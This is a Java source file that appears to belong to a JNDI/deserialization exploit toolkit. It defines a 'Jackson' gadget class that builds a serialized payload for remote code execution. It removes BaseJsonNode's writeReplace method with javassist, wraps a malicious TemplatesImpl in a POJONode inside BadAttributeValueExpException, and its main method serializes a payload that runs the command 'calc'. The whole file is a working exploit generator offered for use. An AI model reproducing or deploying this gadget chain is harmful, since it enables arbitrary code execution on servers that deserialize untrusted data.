package com.nu1r.jndi.gadgets;

import com.fasterxml.jackson.databind.node.BaseJsonNode;
import com.fasterxml.jackson.databind.node.POJONode;
import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.nu1r.jndi.gadgets.utils.Reflections;
import com.nu1r.jndi.gadgets.utils.Serializer;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import com.fasterxml.jackson.databind.node.BaseJsonNode;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.util.Arrays;
import java.util.HashMap;

public class Jackson implements ObjectPayload<Object> {

    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        final Object template = Gadgets.createTemplatesImpl(type, param);

        ClassPool pool = ClassPool.getDefault();
        //pool.insertClassPath(new ClassClassPath(Class.forName("com.fasterxml.jackson.databind.node.BaseJsonNode")));
        CtClass ctClass = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        // 将修改后的CtClass加载至当前线程的上下文类加载器中
        ctClass.toClass();

        POJONode node = new POJONode(template);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", node);

        HashMap hashMap = new HashMap();
        hashMap.put(template, badAttributeValueExpException);

        return hashMap;
    }

    public static void main(String[] args) throws Exception {
        ObjectPayload payload = Jackson.class.newInstance();
        Object                object = payload.getObject(PayloadType.nu1r, "calc");
        ByteArrayOutputStream out    = new ByteArrayOutputStream();
        byte[]                bytes  = Serializer.serialize(object, out);
        System.out.println(Arrays.toString(bytes));
    }
}
